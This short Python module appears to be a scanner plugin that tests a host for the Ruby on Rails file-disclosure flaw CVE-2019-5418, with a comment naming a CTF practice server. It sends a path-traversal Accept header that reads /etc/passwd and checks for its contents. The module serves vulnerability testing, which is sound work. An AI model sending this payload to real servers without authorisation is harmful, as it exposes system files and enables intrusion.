import requests
from utils import ping
from utils.status import *

class CVE_2019_5418:
    def __init__(self, host) -> None:
        self.name        = "Ruby on Rails LFI - CVE_2019_5418"
        self.enable      = True
        self.description = ""
        self.host = host

    def isAlive(self, host):
        return ping.is_alive(host)


    def main(self):
        if self.isAlive(self.host):
            poc = self.host + 'robots'  # http://node4.buuoj.cn:26337/robots
            headers = {
                            "User-Agent": "bugbounty",
                            "Accept": "../../../../../../../../../../etc/passwd{{"
                        }
            request = requests.request('GET', poc, headers=headers, timeout=5)

            if 'root:x:0:0:root' in request.text:
                return SUCCESS
            else:
                return FAILED
        else:
            return ERROR
        